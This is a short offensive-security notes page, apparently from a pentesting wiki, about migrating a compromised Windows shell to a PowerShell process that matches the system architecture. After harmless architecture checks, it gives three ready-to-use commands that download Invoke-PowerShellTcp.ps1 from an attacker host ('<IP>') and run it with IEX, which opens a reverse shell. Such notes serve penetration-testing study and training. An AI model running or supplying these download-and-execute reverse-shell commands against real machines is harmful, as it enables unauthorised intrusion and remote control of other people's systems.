# Process migration

Sometimes, we can access the machine with a certain architecture (x86 or x64) but our shell is running under a process that does not correspond to the machine's architecture. This can cause false positives in the vulnerability enumeration, so it is recommended to migrate to a process with the same system architecture. We have Metasploit that does it automatically but we can do it manually.

{% tabs %}
{% tab title="PowerShell" %}
### Verification

```powershell
# Is the operating system on an x64 architecture? 
systeminfo
[Environment]::Is64BitOperatingSystem # True/False
# Is the current process x64?
[Environment]::Is64BitProcess # True/False
# (optional) Is it the current x64 process? 
(Get-Process -Id $PID).StartInfo.EnvironmentVariables["PROCESSOR_ARCHITECTURE"]; # x86/AMD64
```

### Method

If the system architecture does not match the current process architecture, or vice versa, then we must perform a process migration, calling the system's native PowerShell.

```powershell
start /b C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<IP>/Invoke-PowerShellTcp.ps1')
start /b C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<IP>/Invoke-PowerShellTcp.ps1')
start /b C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<IP>/Invoke-PowerShellTcp.ps1')
```
{% endtab %}
{% endtabs %}
